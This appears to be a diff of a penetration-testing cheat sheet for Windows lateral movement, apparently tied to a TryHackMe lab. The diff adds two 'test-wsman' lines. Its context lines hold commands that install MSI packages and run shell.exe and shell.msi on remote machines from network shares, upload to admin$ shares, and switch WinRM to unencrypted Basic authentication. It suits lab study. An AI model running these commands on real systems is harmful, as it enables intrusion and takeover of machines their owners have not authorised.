@@ -10,6 +10,8 @@ $Opt = New-CimSessionOption -Protocol DCOM
 $Session = New-Cimsession -ComputerName 192.168.10.142 -Credential $credential -SessionOption $Opt -ErrorAction Stop
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
 
+test-wsman -computername "WIN-S0V7KMTVLD2"
+
 smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/'
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc.exe'; CurrentDirectory='C:\windows'}
 Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","\\192.168.1.4\sharename\shell.msi") -ComputerName dc1 -Credential $credential
@@ -31,6 +33,7 @@ set-item .\allowunencrypted $true
 set-item  WSMan:\localhost\Service\Auth\Basic $true # For domain environment
 set-item  WSMan:\localhost\Service\AllowUnencrypted $true# For domain environment
 
+test-wsman -computername "WIN-S0V7KMTVLD2"
 New-PSSession -ComputerName 192.168.1.2 -Credential (Get-Credential)
 Enter-PSSession 2 cmd.exe /c \\192.168.1.4\sharename\shell.exe
 winrs /r:192.168.10.142 /username:administrator /password:P@ssw0rd "cmd.exe /c ipconfig"
